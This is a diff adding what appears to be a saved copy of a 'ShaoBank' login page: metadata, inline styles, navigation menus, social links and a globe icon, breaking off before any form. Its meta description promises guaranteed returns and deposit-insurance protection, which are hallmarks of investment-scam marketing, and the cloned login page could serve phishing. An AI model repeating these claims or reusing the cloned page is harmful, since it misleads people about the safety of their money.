@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en" style="--vh: 8.96px;">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <!--<base href="/">-->
+      <base href=".">
+      <meta content="width=device-width, initial-scale=1" name="viewport">
+      <meta content="ie=edge" http-equiv="x-ua-compatible">
+      <title>Log in to account - ShaoBank</title>
+      <meta name="title" content="Shao Bank - the way to success!">
+      <meta name="description" content="Save your savings and get guaranteed returns. Make a deposit within 5 minutes and receive a fixed income every month. Your account is protected by the deposit insurance system in Hong Kong.">
+      <meta property="og:type" content="website">
+      <meta property="og:title" content="Shao Bank - the way to success!">
+      <meta property="og:description" content="Save your savings and get guaranteed returns. Make a deposit within 5 minutes and receive a fixed income every month. Your account is protected by the deposit insurance system in Hong Kong.">
+      <meta property="og:site_name" content="Shao Bank">
+      <meta property="og:url" content="https://shaobank.com">
+      <meta property="og:image:width" content="1200">
+      <meta property="og:image:height" content="630">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta property="og:image" content="/assets/img/preview.png">
+      <link rel="image_src" href="https://shaobank.com/assets/img/preview.png">
+      <meta name="twitter:image" content="/assets/img/preview.png">
+      <link rel="icon" type="image/x-icon" href="https://shaobank.com/assets/img/favicon/favicon.ico">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://shaobank.com/assets/img/favicon/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="https://shaobank.com/assets/img/favicon/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://shaobank.com/assets/img/favicon/favicon-16x16.png">
+      <link rel="manifest" href="https://shaobank.com/asset s/img/favicon/site.webmanifest">
+      <link rel="mask-icon" href="https://shaobank.com/assets/img/favicon/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#017efb">
+      <meta name="theme-color" content="#ffffff">
+      <style>@charset "UTF-8";:root{--animate-duration:1s;--animate-delay:1s;--animate-repeat:1}html{box-sizing:border-box;-ms-overflow-style:scrollbar}*,:after,:before{box-sizing:inherit}:root{--swiper-theme-color:#007AFF }:root{--swiper-navigation-size:44px }html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-MediumItalic.eot);src:local("Roboto Medium Italic"),local("Roboto-MediumItalic"),url(/assets/fonts/Roboto-MediumItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-MediumItalic.woff) format("woff"),url(/assets/fonts/Roboto-MediumItalic.ttf) format("truetype");font-weight:500;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Italic.eot);src:local("Roboto Italic"),local("Roboto-Italic"),url(/assets/fonts/Roboto-Italic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Italic.woff) format("woff"),url(/assets/fonts/Roboto-Italic.ttf) format("truetype");font-weight:400;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Bold.eot);src:local("Roboto Bold"),local("Roboto-Bold"),url(/assets/fonts/Roboto-Bold.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Bold.woff) format("woff"),url(/assets/fonts/Roboto-Bold.ttf) format("truetype");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Regular.eot);src:local("Roboto"),local("Roboto-Regular"),url(/assets/fonts/Roboto-Regular.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Regular.woff) format("woff"),url(/assets/fonts/Roboto-Regular.ttf) format("truetype");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Medium.eot);src:local("Roboto Medium"),local("Roboto-Medium"),url(/assets/fonts/Roboto-Medium.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Medium.woff) format("woff"),url(/assets/fonts/Roboto-Medium.ttf) format("truetype");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-BoldItalic.eot);src:local("Roboto Bold Italic"),local("Roboto-BoldItalic"),url(/assets/fonts/Roboto-BoldItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-BoldItalic.woff) format("woff"),url(/assets/fonts/Roboto-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-ThinItalic.eot);src:local("Roboto Thin Italic"),local("Roboto-ThinItalic"),url(/assets/fonts/Roboto-ThinItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-ThinItalic.woff) format("woff"),url(/assets/fonts/Roboto-ThinItalic.ttf) format("truetype");font-weight:100;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Black.eot);src:local("Roboto Black"),local("Roboto-Black"),url(/assets/fonts/Roboto-Black.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Black.woff) format("woff"),url(/assets/fonts/Roboto-Black.ttf) format("truetype");font-weight:900;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Light.eot);src:local("Roboto Light"),local("Roboto-Light"),url(/assets/fonts/Roboto-Light.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Light.woff) format("woff"),url(/assets/fonts/Roboto-Light.ttf) format("truetype");font-weight:300;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-LightItalic.eot);src:local("Roboto Light Italic"),local("Roboto-LightItalic"),url(/assets/fonts/Roboto-LightItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-LightItalic.woff) format("woff"),url(/assets/fonts/Roboto-LightItalic.ttf) format("truetype");font-weight:300;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-BlackItalic.eot);src:local("Roboto Black Italic"),local("Roboto-BlackItalic"),url(/assets/fonts/Roboto-BlackItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-BlackItalic.woff) format("woff"),url(/assets/fonts/Roboto-BlackItalic.ttf) format("truetype");font-weight:900;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Thin.eot);src:local("Roboto Thin"),local("Roboto-Thin"),url(/assets/fonts/Roboto-Thin.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Thin.woff) format("woff"),url(/assets/fonts/Roboto-Thin.ttf) format("truetype");font-weight:100;font-style:normal;font-display:swap}*{box-sizing:border-box}html,body{font-family:Roboto,sans-serif}html{font-size:14px}@media (max-width: 480px){html{font-size:12px}}</style>
+      <link rel="stylesheet" href="./Log in to account - ShaoBank_files/styles.e1c5dc243b6e694f.css" media="all" onload="this.media=&#39;all&#39;">
+      <noscript>
+         <link rel="stylesheet" href="styles.e1c5dc243b6e694f.css">
+      </noscript>
+      <style>#spinner[_ngcontent-mrm-c23]{top:50%;left:50%;transform:translate(-50%,-50%);position:fixed;z-index:9999}#spinner.backdrop[_ngcontent-mrm-c23]{top:0;left:0;height:100%;width:100%;display:flex;align-items:center;justify-content:center;transform:none}  .colored-parent,   .colored>div{background-color:#333}</style>
+      <style>.sk-double-bounce[_ngcontent-mrm-c17]{top:50%;width:40px;height:40px;position:relative;margin:auto}.sk-double-bounce[_ngcontent-mrm-c17]   .sk-child[_ngcontent-mrm-c17]{width:100%;height:100%;border-radius:50%;background-color:#333;opacity:.6;position:absolute;top:0;left:0;animation:sk-doubleBounce 2s infinite ease-in-out}.sk-double-bounce[_ngcontent-mrm-c17]   .sk-double-bounce2[_ngcontent-mrm-c17]{animation-delay:-1s}@keyframes sk-doubleBounce{0%,to{transform:scale(0)}50%{transform:scale(1)}}</style>
+   
+   </head>
+   <body style="padding-right: 0px; overflow-y: auto;">
+      <app-root ng-version="14.2.10">
+         <ng-http-loader _nghost-mrm-c23="">
+            <!---->
+         </ng-http-loader>
+         <router-outlet></router-outlet>
+         <ng-component>
+            <div class="wrapper animate__animated animate__faster animate__fadeIn">
+               <app-header>
+                  <div class="m-nav">
+                     <div nicescroll="" class="nicescroll-box" style="overflow: hidden; position: relative; outline: none; cursor: grab; touch-action: none;">
+                        <div class="wrap" style="transition: transform 0ms ease-out 0s; transform: translate3d(0px, 0px, 0px);">
+                           <app-mobile-menu>
+                              <div accordion="" class="accordion" style="width: 100%;">
+                                 <div class="accordion__item">
+                                    <div class="accordion__head">
+                                       Digital banking 
+                                       <svg>
+                                          <use xlink:href="assets/img/sprite.svg#arrow"></use>
+                                       </svg>
+                                    </div>
+                                    <div class="accordion__body"><a routerlink="/" routerlinkactive="active" href="https://shaobank.com/">Digital banking</a><a routerlink="/banking" routerlinkactive="active" href="https://shaobank.com/banking">Banking</a><a routerlink="/deposits" routerlinkactive="active" href="https://shaobank.com/deposits">Deposits</a><a routerlink="/bonds" routerlinkactive="active" href="https://shaobank.com/bonds">Bonds</a><a routerlink="/loans" routerlinkactive="active" href="https://shaobank.com/loans">Lending</a><a routerlink="/help" routerlinkactive="active" href="https://shaobank.com/help">Help &amp; Support</a></div>
+                                 </div>
+                                 <div class="accordion__item">
+                                    <div class="accordion__head">
+                                       Business 
+                                       <svg>
+                                          <use xlink:href="assets/img/sprite.svg#arrow"></use>
+                                       </svg>
+                                    </div>
+                                    <div class="accordion__body"><a routerlink="/business" routerlinkactive="active" href="https://shaobank.com/business">Business</a><a routerlink="/career" routerlinkactive="active" href="https://shaobank.com/career">Careers</a><a routerlink="/market-analysis" routerlinkactive="active" href="https://shaobank.com/market-analysis">Market Analysis</a><a routerlink="/partners" routerlinkactive="active" href="https://shaobank.com/partners">Our Affiliates</a><a routerlink="/why" routerlinkactive="active" href="https://shaobank.com/why">Why Shao Bank?</a></div>
+                                 </div>
+                                 <div class="accordion__item">
+                                    <div class="accordion__head">
+                                       Insurance 
+                                       <svg>
+                                          <use xlink:href="assets/img/sprite.svg#arrow"></use>
+                                       </svg>
+                                    </div>
+                                    <div class="accordion__body"><a routerlink="/insurance" routerlinkactive="active" href="https://shaobank.com/insurance">Insurance</a><a routerlink="/security" routerlinkactive="active" href="https://shaobank.com/security">Protecting your account</a><a routerlink="/fraud-warning" routerlinkactive="active" href="https://shaobank.com/fraud-warning">Fraud prevention</a><a routerlink="/series" routerlinkactive="active" href="https://shaobank.com/series">Bonds series</a></div>
+                                 </div>
+                                 <div class="accordion__item">
+                                    <div class="accordion__head">
+                                       Who we are? 
+                                       <svg>
+                                          <use xlink:href="assets/img/sprite.svg#arrow"></use>
+                                       </svg>
+                                    </div>
+                                    <div class="accordion__body"><a routerlink="/about" routerlinkactive="active" href="https://shaobank.com/about">Who we are?</a><a routerlink="/documents" routerlinkactive="active" href="https://shaobank.com/documents">Documentation</a><a routerlink="/roadmap" routerlinkactive="active" href="https://shaobank.com/roadmap">Roadmap</a><a routerlink="/white-paper" routerlinkactive="active" href="https://shaobank.com/white-paper">White Paper</a></div>
+                                 </div>
+                              </div>
+                           </app-mobile-menu>
+                           <app-auth-buttons class="mb-4">
+                              <div class="header-btns"><a routerlink="/auth/signin" class="m-btn tr" href="https://shaobank.com/auth/signin">Log in</a><a routerlink="/auth/signup" class="m-btn" href="https://shaobank.com/auth/signup">Sign up</a></div>
+                           </app-auth-buttons>
+                           <!---->
+                           <app-socials>
+                              <div class="header-soc">
+                                 <a target="_blank" href="https://t.me/shao_bank">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#tg"></use>
+                                    </svg>
+                                 </a>
+                                 <a target="_blank" href="https://www.youtube.com/channel/UC90vz-9EuPViNLmWfG0ZZgw">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#yt"></use>
+                                    </svg>
+                                 </a>
+                                 <a target="_blank" href="https://twitter.com/shaobank">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#tw"></use>
+                                    </svg>
+                                 </a>
+                                 <a target="_blank" href="https://www.facebook.com/shaobank">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#fb"></use>
+                                    </svg>
+                                 </a>
+                                 <a target="_blank" href="https://www.instagram.com/bankshao">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#inst"></use>
+                                    </svg>
+                                 </a>
+                                 <a target="_blank" href="https://www.linkedin.com/company/bank-shao">
+                                    <svg>
+                                       <use xlink:href="assets/img/sprite.svg#in"></use>
+                                    </svg>
+                                 </a>
+                                 <!---->
+                              </div>
+                              <!---->
+                           </app-socials>
+                        </div>
+                        <div id="ascrail2000" class="nicescroll-rails nicescroll-rails-vr" style="width: 2px; z-index: 20; cursor: grab; position: absolute; top: 0px; right: 0px; opacity: 1; touch-action: none; display: none; height: 832px;">
+                           <div class="nicescroll-cursors" style="position: relative; top: 0px; float: right; width: 2px; height: 0px; background-color: rgb(1, 126, 251); border: 0px solid rgb(255, 255, 255); background-clip: padding-box; border-radius: 0px; touch-action: none;"></div>
+                        </div>
+                        <div id="ascrail2000-hr" class="nicescroll-rails nicescroll-rails-hr" style="height: 2px; z-index: 20; position: absolute; left: 0px; bottom: 0px; opacity: 1; display: none; width: 414px;">
+                           <div class="nicescroll-cursors" style="position: absolute; top: 0px; height: 2px; width: 0px; background-color: rgb(1, 126, 251); border: 0px solid rgb(255, 255, 255); background-clip: padding-box; border-radius: 0px;"></div>
+                        </div>
+                     </div>
+                  </div>
+                  <!---->
+                  <header class="header">
+                     <div class="container">
+                        <div class="header-wrap">
+                           <div class="header-left">
+                              <div class="header-burger"><span></span></div>
+                              <a routerlink="/" class="header-logo" href="https://shaobank.com/">
+                                 <img src="./Log in to account - ShaoBank_files/logo.svg" alt="">
+                                 <p><span>Shao</span>Bank</p>
+                              </a>
+                           </div>
+                           <div class="header-right">
+                              <div class="header-top">
+                                 <div class="header-tabs">
+                                    <div class="header-tabs__item active">Digital banking</div>
+                                    <div class="header-tabs__item">Business</div>
+                                    <div class="header-tabs__item">Insurance</div>
+                                    <div class="header-tabs__item">Who we are?</div>
+                                 </div>
+                                 <div class="header-nav">
+                                    <div class="header-lang">
+                                       
+                                 
+
+<svg version="1.2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 97 96" width="97" height="96">
+   <title>Screenshot 2023-08-05 at 02</title>
+   <style>
+      .s0 { fill: none;stroke: #bbc0c4;stroke-width: 2 } 
+      .s1 { fill: #75808a00 } 
+      .s2 { fill: #778089 } 
+   </style>
+   <g id="Layer">
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m96.9 48c0-6.3-1.2-12.5-3.6-18.3-2.4-5.9-6-11.1-10.4-15.6-4.5-4.4-9.8-8-15.6-10.4-5.8-2.4-12-3.6-18.3-3.6-6.3 0-12.5 1.2-18.3 3.6-5.9 2.4-11.1 6-15.6 10.4-4.4 4.5-8 9.7-10.4 15.6-2.4 5.8-3.6 12-3.6 18.3 0 6.3 1.2 12.5 3.6 18.3 2.4 5.9 6 11.1 10.4 15.6 4.5 4.4 9.7 8 15.6 10.4 5.8 2.4 12 3.6 18.3 3.6 6.3 0 12.5-1.2 18.3-3.6 5.8-2.4 11.1-6 15.6-10.4 4.4-4.5 8-9.7 10.4-15.6 2.4-5.8 3.6-12 3.6-18.3z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m35.3 24.1c9.9 0.5 19.4 0.6 27.5 0q0.6 0 0.4-0.7c-1.6-5.4-5.8-15.2-11.5-17.6-8.3-3.4-15.5 11.6-16.8 17.6q-0.2 0.6 0.4 0.6z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m29.3 22.5c1.1-3.9 3.6-11.3 6.8-14.5q0.1-0.1 0.1-0.2 0-0.1 0-0.2-0.1 0-0.2-0.1-0.1 0-0.2 0.1-12.1 4.5-20.6 14.4-0.1 0.1 0.1 0.2l11.9 1.7q1.7 0.2 2.1-1.4z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m62.8 8c2.6 5.2 4.9 9.7 6.4 15.4q0.1 0.6 0.6 0.5l12.7-1.6q0.1 0 0.2 0 0-0.1 0.1-0.2 0-0.1 0-0.1 0-0.1-0.1-0.2-8-9.6-19.7-14.1-0.5-0.2-0.2 0.3z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m26.9 29.3l-14.6-1.6q-0.7-0.1-0.9 0.5-3.9 8-4.9 16.8 0 0.5 0.5 0.5h18.2q0.4 0 0.4-0.4l1.8-15.2q0-0.5-0.5-0.6z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m70.9 29.9l1.6 15.1q0.1 0.5 0.5 0.5h18q0.5 0 0.4-0.5-0.8-9-5.1-16.8-0.1-0.1-0.1-0.2-0.1-0.1-0.2-0.2-0.2 0-0.3-0.1-0.1 0-0.2 0l-14.2 1.6q-0.5 0.1-0.4 0.6z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m31.6 45h34.7q0 0 0.1 0 0.1 0 0.1-0.1 0 0 0.1-0.1 0 0 0-0.1v-7.3q0-1.6-0.2-2.9-0.2-1.4-0.5-2.5-0.3-1.1-0.8-1.6-0.4-0.6-0.9-0.6h-30.5q-0.4 0-0.9 0.6-0.4 0.5-0.7 1.6-0.4 1.1-0.6 2.5-0.1 1.3-0.2 2.8v7.4q0.1 0.1 0.1 0.1 0 0.1 0 0.1 0.1 0.1 0.1 0.1 0.1 0 0.1 0z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m27.1 66.8l-1.7-15.4q0-0.1 0-0.1-0.1-0.1-0.1-0.2-0.1 0-0.2-0.1-0.1 0-0.2 0h-18.1q0 0-0.1 0-0.1 0.1-0.1 0.1-0.1 0.1-0.1 0.2 0 0.1 0 0.1 1.3 8.9 5.2 17.1 0.2 0.5 0.7 0.4l14.3-1.7q0.4 0 0.4-0.4z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m66.4 51h-34.5q-0.1 0-0.1 0.1-0.1 0-0.1 0 0 0 0 0.1-0.1 0-0.1 0.1v7q0 1.6 0.2 3 0.2 1.5 0.5 2.6 0.3 1.1 0.7 1.7 0.4 0.6 0.9 0.6h30.5q0.5 0 0.9-0.6 0.4-0.6 0.7-1.7 0.3-1.2 0.5-2.6 0.1-1.5 0.1-3.1v-7q0 0 0-0.1 0 0 0-0.1-0.1 0-0.1 0-0.1 0-0.1 0z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m72.3 51.5l-1.6 15.2q-0.1 0.5 0.4 0.5l14.6 1.8q0.4 0 0.6-0.4 4.1-8 5.2-17 0-0.1 0-0.2 0-0.1-0.1-0.2-0.1-0.1-0.2-0.2-0.1 0-0.2 0h-18.2q-0.4 0-0.5 0.5z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m62.6 71.9c-10-0.4-19.4-0.6-27.4 0q-0.6 0-0.5 0.7c1.7 5.6 9.5 24.1 18.7 16.2q7.6-6.4 9.6-16.2 0.2-0.6-0.4-0.7z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m15.7 74.6q7.6 9.7 19.3 13.7 0.1 0 0.1 0 0.1 0 0.1-0.1 0.1 0 0.1-0.1 0-0.1 0-0.1-4.2-7.1-6.4-15.1 0-0.2-0.1-0.3-0.2-0.2-0.3-0.3-0.2-0.1-0.4-0.1-0.1-0.1-0.3 0l-11.7 1.4q-1.1 0.2-0.4 1z"/>
+      <path id="Layer" fill-rule="evenodd" class="s0" d="m69.2 72.5c-1.5 6.5-3.8 10-7 15.5q-0.4 0.6 0.3 0.3 11.7-4.5 20-13.9 0.4-0.5-0.3-0.6l-12.3-1.7q-0.6-0.1-0.7 0.4z"/>
+   </g>
+   <path id="Layer" fill-rule="evenodd" class="s1" d="m-1-6h102v108h-102zm97.9 54c0-6.3-1.2-12.5-3.6-18.3-2.4-5.9-6-11.1-10.4-15.6-4.5-4.4-9.8-8-15.6-10.4-5.8-2.4-12-3.6-18.3-3.6-6.3 0-12.5 1.2-18.3 3.6-5.9 2.4-11.1 6-15.6 10.4-4.4 4.5-8 9.7-10.4 15.6-2.4 5.8-3.6 12-3.6 18.3 0 6.3 1.2 12.5 3.6 18.3 2.4 5.9 6 11.1 10.4 15.6 4.5 4.4 9.7 8 15.6 10.4 5.8 2.4 12 3.6 18.3 3.6 6.3 0 12.5-1.2 18.3-3.6 5.8-2.4 11.1-6 15.6-10.4 4.4-4.5 8-9.7 10.4-15.6 2.4-5.8 3.6-12 3.6-18.3z"/>
+   <path id="Layer" fill-rule="evenodd" class="s2" d="m96.9 48c0 6.3-1.2 12.5-3.6 18.3-2.4 5.9-6 11.1-10.4 15.6-4.5 4.4-9.8 8-15.6 10.4-5.8 2.4-12 3.6-18.3 3.6-6.3 0-12.5-1.2-18.3-3.6-5.9-2.4-11.1-6-15.6-10.4-4.4-4.5-8-9.7-10.4-15.6-2.4-5.8-3.6-12-3.6-18.3 0-6.3 1.2-12.5 3.6-18.3 2.4-5.9 6-11.1 10.4-15.6 4.5-4.4 9.7-8 15.6-10.4 5.8-2.4 12-3.6 18.3-3.6 6.3 0 12.5 1.2 18.3 3.6 5.8 2.4 11.1 6 15.6 10.4 4.4 4.5 8 9.7 10.4 15.6 2.4 5.8 3.6 12 3.6 18.3zm-61.6-23.9c9.9 0.5 19.4 0.6 27.5 0q0.6 0 0.4-0.7c-1.6-5.4-5.9-15.2-11.6-17.6-8.3-3.4-15.4 11.6-16.7 17.6q-0.2 0.6 0.4 0.6zm-6-1.5c1.1-4 3.6-11.3 6.8-14.5q0.1-0.1 0.1-0.2 0-0.1 0-0.2-0.1 0-0.2-0.1-0.1 0-0.2 0.1-12.1 4.5-20.6 14.4-0.1 0.1 0.1 0.2l11.9 1.7q1.7 0.2 2.1-1.4zm33.5-14.5c2.6 5.2 4.9 9.7 6.4 15.4q0.1 0.6 0.6 0.5l12.7-1.6q0.1 0 0.2 0 0-0.1 0.1-0.2 0-0.1 0-0.1 0-0.1-0.1-0.2-8-9.6-19.7-14.1-0.5-0.2-0.2 0.3zm-35.9 21.3l-14.6-1.6q-0.7-0.1-1 0.5-3.8 8-4.8 16.8 0 0.5 0.5 0.5h18.2q0.4 0 0.4-0.4l1.8-15.2q0-0.5-0.5-0.6zm44 0.6l1.6 15.1q0.1 0.5 0.5 0.5h18q0.5 0 0.5-0.5-0.9-9-5.2-16.8-0.1-0.1-0.1-0.2-0.1-0.1-0.2-0.2-0.2 0-0.3-0.1-0.1 0-0.2 0l-14.2 1.6q-0.5 0.1-0.4 0.6zm-39.3 15.1h34.7q0 0 0.1 0 0.1 0 0.1-0.1 0 0 0.1-0.1 0 0 0-0.1v-7.4q0-1.5-0.2-2.8-0.2-1.4-0.5-2.5-0.3-1.1-0.8-1.6-0.4-0.6-0.9-0.6h-30.5q-0.4 0-0.9 0.6-0.4 0.5-0.7 1.6-0.4 1.1-0.6 2.5-0.1 1.3-0.2 2.8v7.4q0.1 0.1 0.1 0.1 0 0.1 0 0.1 0.1 0.1 0.1 0.1 0.1 0 0.1 0zm-4.5 21.8l-1.7-15.4q0-0.1 0-0.1-0.1-0.1-0.1-0.2-0.1 0-0.2-0.1-0.1 0-0.2 0h-18.1q0 0-0.1 0-0.1 0.1-0.1 0.1-0.1 0.1-0.1 0.2 0 0.1 0 0.1 1.3 8.9 5.1 17.1 0.3 0.5 0.8 0.4l14.3-1.7q0.4 0 0.4-0.4zm39.3-15.8h-34.5q-0.1 0-0.1 0.1-0.1 0-0.1 0 0 0 0 0.1-0.1 0-0.1 0.1v7q0 1.6 0.2 3 0.2 1.5 0.5 2.6 0.3 1.1 0.7 1.7 0.4 0.6 0.9 0.6h30.5q0.5 0 0.9-0.6 0.4-0.6 0.7-1.7 0.3-1.2 0.5-2.6 0.1-1.5 0.1-3.1v-7q0 0 0-0.1 0 0 0-0.1-0.1 0-0.1 0-0.1 0-0.1 0zm5.9 0.5l-1.6 15.2q-0.1 0.5 0.3 0.5l14.7 1.8q0.4 0 0.6-0.4 4.1-8 5.2-17 0-0.1 0-0.2 0-0.1-0.1-0.2-0.1-0.1-0.2-0.2-0.1 0-0.2 0h-18.2q-0.4 0-0.5 0.5zm-9.7 20.4c-10-0.4-19.4-0.6-27.4 0q-0.6 0-0.5 0.7c1.7 5.6 9.5 24.1 18.7 16.2q7.5-6.4 9.6-16.2 0.2-0.6-0.4-0.7zm-46.9 2.7q7.6 9.7 19.3 13.7 0.1 0 0.1 0 0.1 0 0.1-0.1 0.1 0 0.1-0.1 0-0.1 0-0.1-4.2-7.1-6.4-15.1 0-0.2-0.1-0.3-0.2-0.2-0.3-0.3-0.2-0.1-0.4-0.1-0.1-0.1-0.3 0l-11.7 1.4q-1.1 0.2-0.4 1zm53.5-2.1c-1.5 6.5-3.8 10-7 15.5q-0.4 0.6 0.3 0.3 11.7-4.5 20-13.9 0.4-0.5-0.3-0.6l-12.3-1.7q-0.6-0.1-0.7 0.4z"/>
+   <path id="Layer" class="s1" d="m62.8 24.1c-8.1 0.6-17.6 0.5-27.5-0.1q-0.6 0-0.4-0.6c1.3-6 8.5-21 16.8-17.6 5.7 2.4 9.9 12.2 11.5 17.6q0.2 0.7-0.4 0.7z"/>
+   <path id="Layer" class="s1" d="m36.1 8c-3.2 3.2-5.7 10.6-6.8 14.5q-0.4 1.6-2.1 1.4l-11.9-1.7q-0.2-0.1-0.1-0.2 8.5-9.9 20.6-14.4 0.1-0.1 0.2-0.1 0.1 0.1 0.2 0.1 0 0.1 0 0.2 0 0.1-0.1 0.2z"/>
+   <path id="Layer" class="s1" d="m69.2 23.4c-1.5-5.7-3.8-10.2-6.4-15.4q-0.3-0.5 0.2-0.3 11.7 4.5 19.7 14.1 0.1 0.1 0.1 0.2 0 0 0 0.1-0.1 0.1-0.1 0.2-0.1 0-0.2 0l-12.7 1.6q-0.5 0.1-0.6-0.5z"/>
+   <path id="Layer" class="s1" d="m12.3 27.7l14.6 1.6q0.5 0.1 0.5 0.6l-1.8 15.2q0 0.4-0.4 0.4h-18.2q-0.5 0-0.5-0.5 1-8.8 4.8-16.8 0.3-0.6 1-0.5z"/>
+   <path id="Layer" class="s1" d="m72.5 45l-1.6-15.1q-0.1-0.5 0.4-0.6l14.2-1.6q0.1 0 0.2 0 0.1 0.1 0.3 0.1 0.1 0.1 0.2 0.2 0 0.1 0.1 0.2 4.3 7.8 5.2 16.8 0 0.5-0.5 0.5h-18q-0.4 0-0.5-0.5z"/>
+   <path id="Layer" class="s1" d="m31.6 45q0 0-0.1 0 0 0-0.1-0.1 0 0 0-0.1 0 0 0-0.1v-7.3q0-1.6 0.1-2.9 0.2-1.4 0.6-2.5 0.3-1.1 0.7-1.6 0.5-0.6 0.9-0.6h30.5q0.5 0 0.9 0.6 0.5 0.5 0.8 1.6 0.3 1.1 0.5 2.5 0.2 1.3 0.2 2.8v7.4q0 0.1 0 0.1-0.1 0.1-0.1 0.1 0 0.1-0.1 0.1-0.1 0-0.1 0z"/>
+   <path id="Layer" class="s1" d="m25.4 51.4l1.7 15.4q0 0.4-0.4 0.4l-14.3 1.7q-0.5 0.1-0.7-0.4-3.8-8.2-5.2-17.1 0 0 0-0.1 0-0.1 0.1-0.2 0 0 0.1-0.1 0.1 0 0.1 0h18.1q0.1 0 0.2 0 0.1 0.1 0.2 0.1 0 0.1 0.1 0.2 0 0 0 0.1z"/>
+   <path id="Layer" class="s1" d="m66.4 51q0 0 0.1 0 0 0 0.1 0 0 0.1 0 0.1 0 0.1 0 0.1v7q0 1.6-0.1 3.1-0.2 1.4-0.5 2.6-0.3 1.1-0.7 1.7-0.4 0.6-0.9 0.6h-30.5q-0.5 0-0.9-0.6-0.4-0.6-0.7-1.7-0.3-1.1-0.5-2.6-0.2-1.4-0.2-3v-7q0-0.1 0.1-0.1 0-0.1 0-0.1 0 0 0.1 0 0-0.1 0.1-0.1z"/>
+   <path id="Layer" class="s1" d="m70.7 66.7l1.6-15.2q0.1-0.5 0.5-0.5h18.2q0.1 0 0.2 0 0.1 0.1 0.2 0.2 0.1 0.1 0.1 0.2 0 0.1 0 0.2-1.1 9-5.2 17-0.2 0.4-0.6 0.4l-14.7-1.8q-0.4 0-0.3-0.5z"/>
+   <path id="Layer" class="s1" d="m35.2 71.9c8-0.6 17.4-0.4 27.4 0q0.6 0.1 0.4 0.7-2 9.8-9.6 16.2c-9.2 7.9-17-10.6-18.7-16.2q-0.1-0.7 0.5-0.7z"/>
+   <path id="Layer" class="s1" d="m15.7 74.6q-0.7-0.8 0.4-1l11.7-1.4q0.2-0.1 0.3 0 0.2 0 0.4 0.1 0.1 0.1 0.3 0.3 0.1 0.1 0.1 0.3 2.2 8 6.4 15.1 0 0 0 0.1 0 0.1-0.1 0.1 0 0.1-0.1 0.1 0 0-0.1 0-11.7-4-19.3-13.7z"/>
+   <path id="Layer" class="s1" d="m62.2 88c3.2-5.5 5.5-9 7-15.5q0.1-0.5 0.7-0.4l12.3 1.7q0.7 0.1 0.3 0.6-8.3 9.4-20 13.9-0.7 0.3-0.3-0.3z"/>
+</svg>
+
+
+                                       <div class="header-lang__hide">
